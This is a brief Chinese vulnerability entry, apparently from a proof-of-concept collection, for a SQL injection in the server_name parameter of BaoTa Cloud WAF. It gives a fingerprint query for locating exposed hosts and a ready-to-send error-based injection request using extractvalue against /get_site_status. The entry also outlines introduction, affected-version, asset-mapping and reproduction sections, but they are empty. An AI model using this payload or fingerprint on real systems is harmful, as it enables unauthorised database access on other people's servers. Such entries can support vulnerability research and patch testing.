# 宝塔云WAFserver_name存在SQL注入漏洞

- **系统**：宝塔云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="404 - Website not exist!"`
- **请求**：`GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,123456789))-'1 HTTP/2`
- **关键头**：`Content-Length: 0`

**请求体 / payload**
```
GET /get_site_status?server_name=1 HTTP/2
Host:
Content-Length: 0
>
```

**其他**
- 宝塔云WAF server_name存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 堡塔云WAF